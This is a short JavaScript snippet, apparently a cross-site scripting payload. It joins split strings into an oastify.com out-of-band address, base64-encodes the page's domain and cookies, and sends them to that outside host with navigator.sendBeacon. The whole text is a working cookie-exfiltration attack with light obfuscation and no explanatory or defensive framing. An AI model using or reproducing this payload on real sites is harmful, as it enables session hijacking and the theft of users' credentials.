(function(){
  const p1 = 'https://fbuyksuwalci';
  const p2 = 'vx4779ocvcfoofu';
  const p3 = '6iw6l.oastify.com';
  
  const endpoint = [p1, p2, p3].join('') + '/?data=';
  
  const exfilData = btoa(document.domain + '|' + document.cookie);
  navigator.sendBeacon(endpoint + exfilData);
})();
